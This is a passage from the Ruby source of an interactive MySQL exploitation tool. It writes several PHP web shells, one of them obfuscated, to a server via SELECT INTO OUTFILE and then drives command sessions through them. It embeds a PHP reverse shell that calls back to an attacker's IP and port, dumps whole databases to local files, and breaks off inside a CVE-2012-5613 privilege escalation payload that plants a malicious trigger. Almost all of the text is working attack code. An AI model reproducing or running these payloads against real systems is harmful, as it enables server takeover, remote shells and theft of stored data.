									query = @db.query("SELECT '#{@code}' INTO OUTFILE '#{@path}#{@fname}';")
									puts
									puts "OK, should be all set if you didn't get any errors".light_green + " :)".white
									puts
								else
									puts
									puts "OK, aborting File Write request".light_green + ".........".white
									puts
									puts "Returning to Main Menu".light_green + "...".white
									puts
									puts
									main_menu
								end
							rescue Mysql::Error => e
								puts
								puts "\t=> #{e}".red
								puts
								main_menu
							end #end begin/rescue wrapper
						when "2"
						#################### MYSQL FILE WRITER - SYSTEM SHELL #####################
							begin
								@code = "<?error_reporting(0);print(___);system($_GET[\\'foo\\']);die;?>"
								puts "Writing Systen($_GET['foo']) Based Shell to: ".light_green + "#{@path}#{@fname}".white
								puts "Confirm you want to write here:".light_green + " Y".white + "/".light_green + "N".white
								answer = gets.chomp
								puts
								if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
									puts "OK, Trying to write system() shell file".light_green + ".......".white
									puts
									query = @db.query("SELECT '#{@code}' INTO OUTFILE '#{@path}#{@fname}';")
									puts
									puts "OK, should be all set if you didn't get any errors".light_green + " :)".white
									puts
									puts "Do you want to use shell now? (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
									answer = gets.chomp
									puts
									if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
										puts "Provide Web Path for: ".light_green + "#{@path}#{@fname}".white
										@wpath = gets.chomp
										puts
										url = URI.parse("#{@wpath}")
										foo=0
										while "#{foo}".to_i < 1
											begin
												print "CMD(Shell)> ".light_green
												@cmd = gets.chomp
												@payload = "#{url.path}?foo=#{@cmd}"
												puts
												if "#{@cmd.upcase}" == "EXIT" or "#{@cmd.upcase}" == "QUIT"
													puts "Exiting CMD Shell session".light_green + "......".white
													puts
													puts "You can come back yourself with curl: ".light_green + "\ncurl -s #{@@host}#{@path}#{@fname}?foo=<INSERT_CMD_HERE>\"".white
													puts
													puts
													break;#Get out of the loop
												end
												http = Net::HTTP.new(url.host, url.port)
												request = Net::HTTP::Get.new("#{URI.encode(@payload)}")
												response = http.request(request)
												foo = response.body
												if response.code == "200"
													if response.body =~ /___(.+)/
														foo = response.body.split('___')
														puts "#{foo[1]}".white
													end
												end
											rescue Timeout::Error
												redo
											rescue Errno::ETIMEDOUT
												redo
											end
										end
									else
										puts
										puts "OK, you can confirm yourself with curl: ".light_green + "\ncurl -s #{@@host}#{@path}#{@fname}?x=<INSERT_BASE64_ENCODED_PHP-EVAL()_CMD_HERE>\"".white
										puts
										puts
										main_menu
									end
								else
									puts
									puts "OK, aborting File Write request".light_green + ".........".white
									puts
									puts "Returning to Main Menu".light_green + "...".white
									puts
									puts
									main_menu
								end
							rescue Mysql::Error => e
								puts
								puts "\t=> #{e}".red
								puts
								main_menu
							end #end begin/rescue wrapper
						when "3"
						#################### MYSQL FILE WRITER - EVAL SHELL #####################
							begin
								@code = "<?error_reporting(0);print(___);eval(base64_decode($_REQUEST[\\'bar\\']));die;?>"
								puts "Writing Eval(Base64($_Request['bar'])) Shell to: ".light_green + "#{@path}#{@fname}".white
								puts "Confirm you want to write here:".light_green + " Y".white + "/".light_green + "N".white
								answer = gets.chomp
								puts
								if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
									puts "OK, Trying to write eval() shell file".light_green + ".......".white
									puts
									query = @db.query("SELECT '#{@code}' INTO OUTFILE '#{@path}#{@fname}';")
									puts
									puts "OK, should be all set if you didn't get any errors".light_green + " :)".white
									puts
									puts "Do you want to use shell now? (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
									answer = gets.chomp
									puts
									if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"

										puts "Provide Web Path for: ".light_green + "#{@path}#{@fname}".white
										@wpath = gets.chomp
										puts
										url = URI.parse("#{@wpath}")
										foo=0
										while "#{foo}".to_i < 1
											begin
												print "eval(Shell)> ".light_green
												@cmd = Base64.encode64("#{gets.chomp}")
												@payload = "#{url.path}?bar=#{@cmd}"
												puts
												if "#{Base64.decode64(@cmd).upcase}" == "EXIT" or "#{Base64.decode64(@cmd).upcase}" == "QUIT"
													puts "Exiting CMD Shell session".light_green + "......".white
													puts
													puts "You can come back yourself with curl: ".light_green + "\ncurl -s #{@@host}#{@path}#{@fname}?bar=<INSERT_BASE64_ENCODED_PHP-EVAL()_CMD_HERE>\"".white
													puts
													puts
													break;#Get out of the loop
												end
												http = Net::HTTP.new(url.host, url.port)
												request = Net::HTTP::Get.new(URI.encode(@payload))
												response = http.request(request)
												foo = response.body
												if response.code == "200"
													if response.body =~ /___(.+)/
														foo = response.body.split('___')
														puts "#{foo[1]}".white
													end
												end
											rescue Timeout::Error
												redo
											rescue Errno::ETIMEDOUT
												redo
											end
										end
									else
										puts
										puts "OK, you can confirm yourself with curl: ".light_green + "\ncurl -s #{@@host}#{@path}#{@fname}?x=<INSERT_BASE64_ENCODED_PHP-EVAL()_CMD_HERE>\"".white
										puts
										puts
										main_menu
									end
								else
									puts
									puts "OK, aborting File Write request".light_green + ".........".white
									puts
									puts "Returning to Main Menu".light_green + "...".white
									puts
									puts
									main_menu
								end
							rescue Mysql::Error => e
								puts
								puts "\t=> #{e}".red
								puts
								main_menu
							end #end begin/rescue wrapper
						when "4"
						#################### MYSQL FILE WRITER - PASSTHRU HEADER SHELL #####################
							begin
								@code = '<?error_reporting(0);print(___);passthru(base64_decode($_SERVER[HTTP_CMD]));die;?>'
								puts "Writing Passthru(Base64($_SERVER[HTTP_CMD])) Shell to: ".light_green + "#{@path}#{@fname}".white
								puts "Confirm you want to write here:".light_green + " Y".white + "/".light_green + "N".white
								answer = gets.chomp
								puts
								if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
									puts "OK, Trying to Write Passthru(Base64($_SERVER[HTTP_CMD])) Shell to file".light_green + ".......".white
									puts
									query = @db.query("SELECT '#{@code}' INTO OUTFILE '#{@path}#{@fname}';")
									puts
									puts "OK, should be all set if you didn't get any errors".light_green + " :)".white
									puts "Do you want to use shell now? (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
									answer = gets.chomp
									puts
									if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"

										puts "Provide Web Path for: ".light_green + "#{@path}#{@fname}".white
										@wpath = gets.chomp
										puts
										url = URI.parse("#{@wpath}")
										foo=0
										while "#{foo}".to_i < 1
											begin
												print "CMD-Shell> ".light_green
												@cmd = Base64.encode64("#{gets.chomp}")
												puts
												if "#{Base64.decode64(@cmd).upcase}" == "EXIT" or "#{Base64.decode64(@cmd).upcase}" == "QUIT"
													puts "Exiting CMD Shell session".light_green + "......".white
													puts
													puts "You can come back yourself with curl: ".light_green + "\ncurl -s #{@@host}#{@path}#{@fname} -H \"CMD: <INSERT_BASE64_ENCODED_CMD_HERE>\"".white
													puts
													puts
													break;#Get out of the loop
												end
												http = Net::HTTP.new(url.host, url.port)
												request = Net::HTTP::Get.new(url.path)
												request.add_field("Cmd", "#{@cmd.chomp}")
												response = http.request(request)
												foo = response.body
												if response.code == "200"
													if response.body =~ /___(.+)/
														foo = response.body.split('___')
														puts "#{foo[1]}".white
													end
												end
											rescue Timeout::Error
												redo
											rescue Errno::ETIMEDOUT
												redo
											end
										end
									else
										puts
										puts "OK, you can confirm yourself with curl: ".light_green + "\ncurl -s #{@@host}#{@path}#{@fname} -H \"CMD: <INSERT_BASE64_ENCODED_CMD_HERE>\"".white
										puts
									end
								else
									puts
									puts "OK, aborting File Write request".light_green + ".........".white
									puts
									puts "Returning to Main Menu".light_green + "...".white
									puts
									puts
									main_menu
								end
							rescue Mysql::Error => e
								puts
								puts "\t=> #{e}".red
								puts
								main_menu
							end #end begin/rescue wrapper
						when "5"
						#################### MYSQL FILE WRITER - CREATE_FUNCTION() HEADER SHELL #####################
							begin
								@code = '<?error_reporting(0);print(___);$b=strrev(\"edoced_4\".\"6esab\");($var=create_function($var,$b($_SERVER[HTTP_CMD])))?$var():0?>'
								puts "Writing Create_function(Base64($_SERVER[HTTP_CMD])) Shell to: ".light_green + "#{@path}#{@fname}".white
								puts "Confirm you want to write here:".light_green + " Y".white + "/".light_green + "N".white
								answer = gets.chomp
								puts
								if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
									puts "OK, Trying to Write Create_function(Base64($_SERVER[HTTP_CMD])) Shell to file".light_green + ".......".white
									puts
									query = @db.query("SELECT '#{@code}' INTO OUTFILE '#{@path}#{@fname}';")
									puts
									puts "OK, should be all set if you didn't get any errors".light_green + " :)".white
									puts "Do you want to use shell now? (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
									answer = gets.chomp
									puts
									if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"

										puts "Provide Web Path for: ".light_green + "#{@path}#{@fname}".white
										@wpath = gets.chomp
										puts
										url = URI.parse("#{@wpath}")
										foo=0
										while "#{foo}".to_i < 1
											begin
												print "CMD-Shell> ".light_green
												@cmd = Base64.encode64("#{gets.chomp}")
												puts
												if "#{Base64.decode64(@cmd).upcase}" == "EXIT" or "#{Base64.decode64(@cmd).upcase}" == "QUIT"
													puts "Exiting CMD Shell session".light_green + "......".white
													puts
													puts "You can come back yourself with curl: ".light_green + "\ncurl -s #{@@host}#{@path}#{@fname} -H \"CMD: <INSERT_BASE64_ENCODED_PHP_CMD_HERE>\"".white
													puts
													puts
													break;#Get out of the loop
												end
												http = Net::HTTP.new(url.host, url.port)
												request = Net::HTTP::Get.new(url.path)
												request.add_field("Cmd", "#{@cmd.chomp}")
												response = http.request(request)
												foo = response.body
												if response.code == "200"
													if response.body =~ /___(.+)/
														foo = response.body.split('___')
														puts "#{foo[1]}".white
													end
												end
											rescue Timeout::Error
												redo
											rescue Errno::ETIMEDOUT
												redo
											end
										end
									else
										puts
										puts "OK, you can confirm yourself with curl: ".light_green + "\ncurl -s #{@@host}#{@path}#{@fname} -H \"CMD: <INSERT_BASE64_ENCODED_PHP_CMD_HERE>\"".white
										puts
									end
								else
									puts
									puts "OK, aborting File Write request".light_green + ".........".white
									puts
									puts "Returning to Main Menu".light_green + "...".white
									puts
									puts
									main_menu
								end
							rescue Mysql::Error => e
								puts
								puts "\t=> #{e}".red
								puts
								main_menu
							end #end begin/rescue wrapper
						else
							foo = Clear.new
							foo.cls
							puts
							puts "Oops, Didn't quite understand that one".light_red + "!".white
							puts "Returning to Main Menu".light_red + "......".white
							puts
							main_menu
					end
					puts
					main_menu
				when "14"
					#################### MYSQL FILE WRITER II #####################
					begin
						puts
						puts "Dropping to LOCAL FILE WRITER-II Shell, just tell it what local file to write and where".light_green + "......".white
						puts "\tLOCAL".white + "(".light_green + "File_Reader".white + ")".light_green + ">".white + " takes path to ".light_green + "LOCAL FILE".white + " you want to write to server".light_green
						puts "\n\tREMOTE".white + "(".light_green + "File_Writer".white + ")".light_green + ">".white + " REMOTE PATH where you want to WRITE FILE on server".light_green
						puts
						puts
						foo=0
						while "#{foo}".to_i < 1
							begin
								print "LOCAL".white + "(".light_green + "path2file".white + ")".light_green + ">".white
								@local = gets.chomp
								puts
								if "#{@local.upcase}" == "EXIT" or "#{@local.upcase}" == "QUIT"
									puts "Exiting SQL File Writer-II Shell session".light_green + "......".white
									puts
									puts
									break;#Get out of the loop
								end
								print "REMOTE".white + "(".light_green + "path2file".white + ")".light_green + ">".white
								@remote = gets.chomp
								puts
								if "#{@remote.upcase}" == "EXIT" or "#{@remote.upcase}" == "QUIT"
									puts "Exiting SQL File Writer-II Shell session".light_green + "......".white
									puts
									puts
									break;#Get out of the loop
								end

								#Read local file into temp table on temp database we create
								query = @db.query('CREATE DATABASE fooooooooooooooofuck;')
								query = @db.query('USE fooooooooooooooofuck;')
								query = @db.query("CREATE TEMPORARY TABLE foo (content LONGTEXT);")
								query = @db.query("LOAD DATA LOCAL INFILE '#{@local}' INTO TABLE fooooooooooooooofuck.foo;")
								puts "Checking LOCAL FILE was read to temp database".light_green + "....".white
								query = @db.query("SELECT * FROM foo;")
								query.each { |x| puts "#{x}".white }
								puts
								puts
								puts "Writing LOCAL FILE '#{@local}' to REMOTE FILE:".light_green + "#{@remote}".white
								query = @db.query("SELECT * FROM foo INTO OUTFILE '#{@remote}';")
								puts
								#Clean the place up....
								puts "All done, cleaning things up".light_green + "....".white
								query = @db.query('DROP TEMPORARY TABLE foo;')
								query = @db.query('DROP DATABASE fooooooooooooooofuck;')
								puts
								puts
								print "Do you want to try and write another local file? (".light_green + "Y".white + "/".light_green + "N".white + ")".light_green
								@answer = gets.chomp
								puts
								if "#{@answer.upcase}" == "N" or "#{@answer.upcase}" == "NO"
									puts
									puts "Exiting SQL File Writer-II Shell session".light_green + "......".white
									puts
									puts
									break;#Get out of the loop
								end
							rescue
								puts "Oops, an error was encountered with your last request".light_red + "!".white
								puts "Error Code: ".light_red + "#{@db.errno}".white
								puts "Error Message: ".light_red + "#{@db.error}".white
								puts
								#Make sure we are clear for next loop...
								query = @db.query('DROP TEMPORARY TABLE foo;')
								query = @db.query('DROP DATABASE fooooooooooooooofuck;')
							end#end rescue wrapper
						end#End of SQL Shell Loop
						puts
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "15"
					#################### PENTESTMONKEY'S PHP REVERSE SHELL #####################
					begin
						puts
						puts "Preparing for PHP Reverse Shell".light_green + "......".white
						puts "REMOTE".white + "(".light_green + "path2file".white + ")".light_green + ">".white + " REMOTE PATH where you want to WRITE ASSISTANT FILE on server, give a file name as well as path\n\t\tThis will trigger the UDF install locally on our remote target server using some assistance from the remote web server's PHP installation".light_green
						puts "REMOTE".white + "(".light_green + "fileURL".white + ")".light_green + ">".white + " URL where you would find UDF_assistant.php FILE after writing to provided path above\n\t\tWe use this to actually trigger the PHP assisted install".light_green + "....".white
						puts
						puts
						puts "Please provide IP to call home on: ".light_green
						@homeIp = gets.chomp
						puts
						puts "Please provide PORT to use when we call home: ".light_green
						@homePort = gets.chomp
						puts
						foo=0
						print "REMOTE".white + "(".light_green + "path2file".white + ")".light_green + ">".white
						@remote = gets.chomp
						puts
						print "REMOTE".white + "(".light_green + "fileURL".white + ")".light_green + ">".white
						@remoteurl = gets.chomp
						puts
						#If our UDF assistant file for some reason already exists, delete that mofo :p
						File.delete("ET_phone_home.php") if File.file?("ET_phone_home.php")
						#PentestMonkey PHP Reverse Shell, smashed a bit but still in tact :p
						puts "Creating Temporary local copy of Pentestmonkey's PHP Reverse Shell for uploading via SQL".light_green + ".....".white
						puts
						@pentestmonkey_reverse = "<?php set_time_limit (0); $VERSION = '1.0'; $ip = '#{@homeIp}'; $port = '#{@homePort}'; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit('ERROR: Cant fork'); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit('Error: Cant setsid()'); exit(1); } $daemon = 1; } else { printit('WARNING: Failed to daemonise.  This is quite common and not fatal.'); } chdir('/'); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } $descriptorspec = array( 0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w') ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit('ERROR: Cant spawn shell'); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { if (feof($sock)) { printit('ERROR: Shell connection terminated'); break; } if (feof($pipes[1])) { printit('ERROR: Shell process terminated'); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit('SOCK READ'); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit('STDOUT READ'); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit('STDERR READ'); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \"$string\n\"; } } ?>"
						# Write to file locally so we can upload in a sec...
						myfile = File.open("ET_phone_home.php", "w+")
						myfile.puts @pentestmonkey_reverse
						myfile.close
						query = @db.query('DROP DATABASE IF EXISTS fooooooooooooooofuck;')
						query = @db.query('CREATE DATABASE fooooooooooooooofuck;')
						# Read local PHP Reverse Shell into table and then write it back out to file
						puts "Creating Temp DB + Table to upload local file to".light_green + ".....".white
						query = @db.query('USE fooooooooooooooofuck;')
						query = @db.query("CREATE TEMPORARY TABLE foo (content LONGTEXT);")
						query = @db.query("LOAD DATA LOCAL INFILE 'ET_phone_home.php' INTO TABLE fooooooooooooooofuck.foo;")
						puts
						puts "Dumping uploaded file content to remote path location".light_green + ".........".white
						query = @db.query("SELECT * FROM foo INTO OUTFILE '#{@remote}';")
						puts
						# Now we activate it by requesting PHP file at remote URL location....
						puts "Activating PHP Reverse Shell, better have your listener open".light_green + ".........".white
						sleep 2;
						begin
							url = URI.parse("#{@remoteurl}")
							http = Net::HTTP.new(url.host, url.port)
							request = Net::HTTP::Get.new(url.path)
							response = http.request(request)
							if response.code == "200"
								puts
								#This should have triggered our reverse shell so dont think you will see this...
								puts "Got r00t".light_green + "?".white
								puts
							else
								puts
								puts "Doesn't appear to be working unfortuanately. Can't seem to locate the remote trigger properly. Maybe try and check manually if it was written (".light_red + "#{@remoteurl}".white + ")? Have listener ready before hand".light_red + "....".white
								puts
								puts "Returning to main menu".light_red + ".....".white
								puts
								main_menu
							end
						rescue Timeout::Error
							puts "Got r00t".light_green + "?".white
						end
						#Clean the place up....
						puts "All done, hopefully you got a shell out of it! \n\tCleaning up database now".light_green + "....".white
						query = @db.query('DROP TEMPORARY TABLE foo;')
						query = @db.query('DROP DATABASE fooooooooooooooofuck;') 
						File.delete("ET_phone_home.php") if File.file?("ET_phone_home.php")
						puts
						puts
						main_menu
					rescue Mysql::Error => e
						puts
						puts "\t=> #{e}".red
						puts
						main_menu
					end #end begin/rescue wrapper
				when "16"
					#################### SQL SHELL #####################
					# Start Loop to Simulate a Command Shell for user....
					puts "Dropping to SQL Shell".light_green + "....".white
					puts
					foo=0
					while "#{foo}".to_i < 1
						begin
							print "SQL-Shell> ".light_green
							@cmd = gets.chomp
							puts
							if "#{@cmd.upcase}" == "EXIT" or "#{@cmd.upcase}" == "QUIT"
								puts "Exiting SQL Shell session".light_green + "......".white
								puts
								puts
								break;#Get out of the loop
							end
							query = @db.query("#{@cmd};")
#							query.each { |x| puts "#{x} ".white }
							query.each { |x| puts "#{x.join(',')}".white } #Gives us better output on multi row results (select * from foo)
							puts
						rescue
							puts "Oops, an error was encountered with your last request".light_red + "!".white
							puts "Error Code: ".light_red + "#{@db.errno}".white
							puts "Error Message: ".light_red + "#{@db.error}".white
							puts
						end#end rescue wrapper
					end#End of SQL Shell Loop
					main_menu
				when "17"
					#################### LOCAL OS SHELL #####################
					puts
					puts "Dropping to LOCAL OS Shell for local commands".light_green + "........".white
					puts
					foo=0
					while "#{foo}".to_i < 1

						print "local(OS-Shell)> ".light_green
						@cmd = gets.chomp
						puts
						if "#{@cmd.upcase}" == "EXIT" or "#{@cmd.upcase}" == "QUIT"
							puts "Exiting LOCAL OS Shell session".light_green + "......".white
							puts
							puts
							break;#Get out of the loop
						end
						rez = `#{@cmd}`
						puts "#{rez}".cyan
					end#End of SQL Shell Loop
					puts
					main_menu
				when "18"
					#################### DUMP TABLE #####################
					puts
					puts "Please provide the name of the DB the target table is in".light_green + ": ".white
					@dbName = gets.chomp
					puts
					puts "Please provide the table within ".light_green + "#{@dbName}".white + " you want to dump: ".light_green
					@tblName = gets.chomp
					puts
					#Results folder for our dumps....
					@resDir = "#{@@host}"
					Dir.mkdir(@resDir) unless File.exists?(@resDir)
					t = Time.now
					timez = t.strftime("%m.%d.%Y")
					puts "Do you want to gzip compress the DUMP File?".light_green + " (".white + "Y".light_green + "/".white + "N".light_green + ")".white
					answer = gets.chomp
					puts
					if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
						puts "Dumping #{@tblName} from #{@dbName}, hang tight".light_green + ".....".white
						system("`which mysqldump` --host=#{@@host} --user=#{@@user} --password=#{@@pass} #{@dbName} #{@tblName} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date | gzip -c > #{@resDir}/#{@dbName}_#{@tblName}_#{timez}.sql.gz")
					else
						puts "Dumping #{@tblName} from #{@dbName}, hang tight".light_green + ".....".white
						system("`which mysqldump` --host=#{@@host} --user=#{@@user} --password=#{@@pass} #{@dbName} #{@tblName} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date > #{@resDir}/#{@dbName}_#{@tblName}_#{timez}.sql")
					end
					puts
					puts "Table Dump Complete".light_green + "!".white
					puts "View it Here: ".light_green + "#{@resDir}/#{@dbName}_#{@tblName}_#{timez}.sql".white
					puts
					main_menu
				when "19"
					#################### DUMP DATABASE #####################
					puts
					puts
					puts "Please provide the name of the DB to DUMP".light_green + ": ".white
					@dbName = gets.chomp
					puts
					#Results folder for our dumps....
					@resDir = "#{@@host}"
					Dir.mkdir(@resDir) unless File.exists?(@resDir)
					t = Time.now
					timez = t.strftime("%m.%d.%Y")
					puts "Do you want to gzip compress the DUMP File?".light_green + " (".white + "Y".light_green + "/".white + "N".light_green + ")".white
					answer = gets.chomp
					puts
					if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
						puts "Dumping #{@dbName}, hang tight".light_green + ".....".white
						system("`which mysqldump` --host=#{@@host} --user=#{@@user} --password=#{@@pass} #{@dbName} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date | gzip -c > #{@resDir}/#{@dbName}_#{@tblName}_#{timez}.sql.gz")
						g=1
					else
						puts "Dumping #{@dbName}, hang tight".light_green + ".....".white
						system("`which mysqldump` --host=#{@@host} --user=#{@@user} --password=#{@@pass} #{@dbName} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date > #{@resDir}/#{@dbName}_#{@tblName}_#{timez}.sql")
						g=0
					end
					puts
					puts "Database Dump Complete".light_green + "!".white
					if "#{g}".to_i == 1
						puts "View it Here: ".light_green + "#{@resDir}/#{@dbName}_#{timez}.sql.gz".white
					else
						puts "View it Here: ".light_green + "#{@resDir}/#{@dbName}_#{timez}.sql".white
					end
					puts
					main_menu
				when "20"
					#################### DUMP ALL #####################
					puts
					puts "Available Databases".light_green + ":".white
					query = @db.query('SHOW DATABASES;')
					query.each { |x| puts "#{x[0]}".white }
					puts
					puts "Please confirm you want to DUMP ALL Databases".light_green + ":".white + " Y".light_green + "/".white + "N".light_green
					answer = gets.chomp
					puts
					if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
						#Results folder for our dumps....
						@resDir = "#{@@host}"
						Dir.mkdir(@resDir) unless File.exists?(@resDir)
						t = Time.now
						timez = t.strftime("%m.%d.%Y")
						puts "Do you want to gzip compress the DUMP File?".light_green + " (".white + "Y".light_green + "/".white + "N".light_green + ")".white
						answer = gets.chomp
						puts
						if "#{answer.upcase}" == "YES" or "#{answer.upcase}" == "Y"
							query = @db.query('SHOW DATABASES;')
							query.each do  |x|
								@dbName = x[0]
								if "#{@dbName.to_s.upcase}" == "MYSQL" or "#{@dbName.to_s.upcase}" == "INFORMATION_SCHEMA" or "#{@dbName.to_s.upcase}" == "TEST" or "#{@dbName.to_s.upcase}" == "DATABASE"
									puts "Skipping: ".green + "#{@dbName}".white
								else
									puts "Dumping: ".light_green + "#{@dbName}".white
									system("`which mysqldump` --host=#{@@host} --user=#{@@user} --password=#{@@pass} #{@dbName} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date | gzip -c > #{@resDir}/#{@dbName}_#{timez}.sql.gz")
									g=1
								end
							end
						else
							query = @db.query('SHOW DATABASES;')
							query.each do |x|
								@dbName = x[0]
								if "#{@dbName.to_s.upcase}" == "MYSQL" or "#{@dbName.to_s.upcase}" == "INFORMATION_SCHEMA" or "#{@dbName.to_s.upcase}" == "TEST" or "#{@dbName.to_s.upcase}" == "DATABASE"
									puts "Skipping: ".green + "#{@dbName}".white
								else
									puts "Dumping: ".light_green + "#{@dbName}".white
									system("`which mysqldump` --host=#{@@host} --user=#{@@user} --password=#{@@pass} #{@dbName} --add-locks --create-options --disable-keys --extended-insert --lock-tables --quick -C --dump-date > #{@resDir}/#{@dbName}_#{timez}.sql")
									g=0
								end
							end
						end
						puts "Dumping ALL Databases available, hang tight".light_green + ".....".white
						#loop through our database names.....skip the defaults which also helps avoid a stupid bug in the latest mysqldump tool which triggers when you try to use the --all-database options. Experienced on multiple versions on multiple distros so we will use this longer method but it gives us nice .sql files per database which keeps size and speed working to our advantage...kind of
						#	+> Error: Couldn't read status information for table general_log ()
						puts
						puts "Database Dump Complete".light_green + "!".white
						puts "View then all here: ".light_green + "#{@resDir}/".white

						if "#{g}".to_i == 1
							system("ls -lua #{@resDir} | grep --color '.sql.gz'")
						else
							system("ls -lua #{@resDir} | grep -v '.gz' | grep --color '.sql'")
						end
						puts
						main_menu
					else
						puts
						puts "OK, Returning to main menu".light_green + "....".white
						puts
						puts
						main_menu
					end
				when "21"
					#################### KINGCOPE CVE-2012-5613 MYSQL PRIV ESCALATION #####################
					puts
					puts "Kingcope CVE-2012-5613 Linux MySQL Privilege Escalation".light_green
					puts
					if "#{@version}" =~ /5.0/
						puts "Version 5.0.x Detected, Setting up payload accordingly".light_green + ".....".white
						puts
					elsif "#{@version}" =~ /5.1/
						puts "Version 5.1.x Detected, Setting up payload accordingly".light_green + ".....".white
						puts
					else
						puts
						puts "This only works on 5.0.x-5.1.x and your version doesn't appear to match either of those. Sorry, but you can't use this option as a result".light_green + ".........".white
						puts
						puts "Returning to Main Menu".light_green + ".....".white
						puts
						main_menu
					end

					puts "Please provide name for Database current user has proper rights to".light_green + ": ".white
					@@database = gets.chomp
					puts
					puts "Please provide name for NEW User we will create".light_green + ": ".white
					@@newuser = gets.chomp
					puts
					puts "Please provide PASSWORD for NEW User are about to create".light_green + ": ".white
					@@newuserpass = gets.chomp
					puts
					# can be 5.1.x or 5.0.x
					if "#{@version}" =~ /5.0/
						@inject = "select 'TYPE=TRIGGERS' into outfile'#{@@datadir}#{@@database}/rootme.TRG' LINES TERMINATED BY '\\ntriggers=\\'CREATE DEFINER=`root`\@`localhost` trigger atk after insert on rootme for each row\\\\nbegin \\\\nUPDATE mysql.user SET Select_priv=\\\\\\'Y\\\\\\', Insert_priv=\\\\\\'Y\\\\\\', Update_priv=\\\\\\'Y\\\\\\', Delete_priv=\\\\\\'Y\\\\\\', Create_priv=\\\\\\'Y\\\\\\', Drop_priv=\\\\\\'Y\\\\\\', Reload_priv=\\\\\\'Y\\\\\\', Shutdown_priv=\\\\\\'Y\\\\\\', Process_priv=\\\\\\'Y\\\\\\', File_priv=\\\\\\'Y\\\\\\', Grant_priv=\\\\\\'Y\\\\\\', References_priv=\\\\\\'Y\\\\\\', Index_priv=\\\\\\'Y\\\\\\', Alter_priv=\\\\\\'Y\\\\\\', Show_db_priv=\\\\\\'Y\\\\\\', Super_priv=\\\\\\'Y\\\\\\', Create_tmp_table_priv=\\\\\\'Y\\\\\\', Lock_tables_priv=\\\\\\'Y\\\\\\', Execute_priv=\\\\\\'Y\\\\\\', Repl_slave_priv=\\\\\\'Y\\\\\\', Repl_client_priv=\\\\\\'Y\\\\\\', Create_view_priv=\\\\\\'Y\\\\\\', Show_view_priv=\\\\\\'Y\\\\\\', Create_routine_priv=\\\\\\'Y\\\\\\', Alter_routine_priv=\\\\\\'Y\\\\\\', Create_user_priv=\\\\\\'Y\\\\\\', ssl_type=\\\\\\'Y\\\\\\', ssl_cipher=\\\\\\'Y\\\\\\', x509_issuer=\\\\\\'Y\\\\\\', x509_subject=\\\\\\'Y\\\\\\', max_questions=\\\\\\'Y\\\\\\', max_updates=\\\\\\'Y\\\\\\', max_connections=\\\\\\'Y\\\\\\' WHERE User=\\\\\\'#{@@user}\\\\\\';\\\\nend\\'\\nsql_modes=0\\ndefiners=\\'root\@localhost\\'\\nclient_cs_names=\\'latin1\\'\\nconnection_cl_names=\\'latin1_swedish_ci\\'\\ndb_cl_names=\\'latin1_swedish_ci\\'\\n';"
					elsif "#{@version}" =~ /5.1/
